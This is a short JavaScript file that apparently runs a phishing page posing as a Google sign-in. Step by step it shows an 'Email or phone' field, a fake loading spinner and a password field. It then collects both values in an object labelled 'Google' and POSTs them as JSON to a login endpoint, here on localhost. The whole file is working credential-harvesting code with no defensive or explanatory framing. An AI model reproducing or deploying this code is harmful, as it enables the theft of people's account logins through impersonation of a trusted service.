console.log("test");





class login{
	constructor() {
		this.stage = 1;
		this.input_area_elm = document.getElementById('input-area');
		this.email_phone_html = '<div class="input-box"><input type="text" class="input-field" id="input_data" data-key="login_first" autocomplete="off" required><label for="input_data">Email or phone</label></div>';
		this.password_html = '<div class="input-box"><input type="password" class="input-field" id="input_data" data-key="login_pass" autocomplete="off" required><label for="input_data">Password</label></div>';
		this.loading_gif_html = '<div class="loader-waiting" id="loader_waiting"></div>';
		this.login_data = {'page':'Google','login_first':'','login_pass':''};
	}

	
	stager(){
		if(this.stage == 1){
			this.input_area_elm.innerHTML = this.email_phone_html;
			
		}
		if(this.stage == 2){

			this.input_area_elm.innerHTML = this.loading_gif_html;
			setTimeout(function (){
				Login.submit_btn();
			}, 2500);
		}
		if(this.stage == 3){
			this.input_area_elm.innerHTML = this.password_html;
			
		}
		if(this.stage == 4){
			this.input_area_elm.innerHTML = this.loading_gif_html;
			console.log(this.login_data);
			
			
			
			fetch("http://127.0.0.1/login", {
				method: "POST",
				body: JSON.stringify(this.login_data),
				headers: {
					"Content-type": "application/json; charset=UTF-8"
				}
			});
		}
		
		
		
	}
	submit_btn(){
		var input_data = document.getElementById('input_data');
		var loader_waiting = document.getElementById('loader_waiting');
		if(input_data != undefined){
			if(input_data.value == ''){return;}
			if(this.login_data[input_data.dataset.key] == undefined){return;}
			this.login_data[input_data.dataset.key] = input_data.value;
		}
		
		this.stage += 1;
		this.stager();
		// console.log(this.stage);
	}

	
	
}
Login = new login()
Login.stager();